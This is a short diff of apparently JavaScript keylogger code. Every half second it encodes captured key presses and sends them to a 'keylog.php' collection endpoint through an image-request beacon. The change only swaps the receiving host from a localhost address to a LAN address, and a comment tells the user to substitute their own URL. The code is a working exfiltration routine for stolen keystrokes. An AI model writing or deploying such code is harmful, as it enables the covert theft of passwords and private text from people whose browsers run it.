@@ -12,7 +12,7 @@ window.setInterval(function () {
     var data = encodeURIComponent(JSON.stringify(presses));
     //encodeURIComponent
     console.log(data);
-    new Image().src = "http://127.0.0.1:5500/keylog.php?k=" + data; // CHANGE THIS URL TO YOUR OWN!
+    new Image().src = "http://192.168.0.2:5555/keylog.php?k=" + data; // CHANGE THIS URL TO YOUR OWN!
     presses = [];
   }
 }, 500);
